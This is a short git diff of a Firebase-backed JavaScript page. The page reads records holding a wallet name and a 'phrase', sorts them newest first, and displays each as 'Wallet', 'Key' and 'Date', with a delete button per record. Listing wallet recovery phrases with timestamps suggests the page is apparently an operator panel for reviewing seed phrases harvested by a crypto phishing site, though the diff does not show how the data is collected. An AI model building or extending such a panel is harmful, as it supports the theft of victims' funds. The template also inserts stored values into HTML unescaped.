@@ -22,7 +22,7 @@ const firebaseConfig = {
     let button = event.target
     let docId = button.parentElement.id
   
-   
+  
     if (confirm('delete sure?')) {
       console.log(docId)
       db.collection('data').doc(docId).delete()
@@ -40,7 +40,7 @@ const firebaseConfig = {
   
   
   //get data
-   db.collection("data").get().then((querySnapshot) => {
+   db.collection("data").orderBy("time", "desc").get().then((querySnapshot) => {
    querySnapshot.forEach((doc) => {
   // doc.data() is never undefined for query doc snapshots
 
@@ -48,11 +48,18 @@ const firebaseConfig = {
   
   let wallet = doc.data().wallet
   let phrase = doc.data().phrase
+  let date = doc.data().time
 
   
   // console.log(`Wallet: ${wallet} <br> ${phrase}`)
   
-  let text = `<p>Wallet: ${wallet} <br> ${phrase}</p><br>`
+  let text = `
+  <div>Wallet: <span>${wallet}</span></div>
+  <div>Key: <span>${phrase}</span></div>
+  <div>Date: <span>${date.toDate()}</span></div>
+  <br><br>
+  `
+
   // let para = document.createElement("div")
   // para.innerHTML = text
   // rootDIV.appendChild(para)
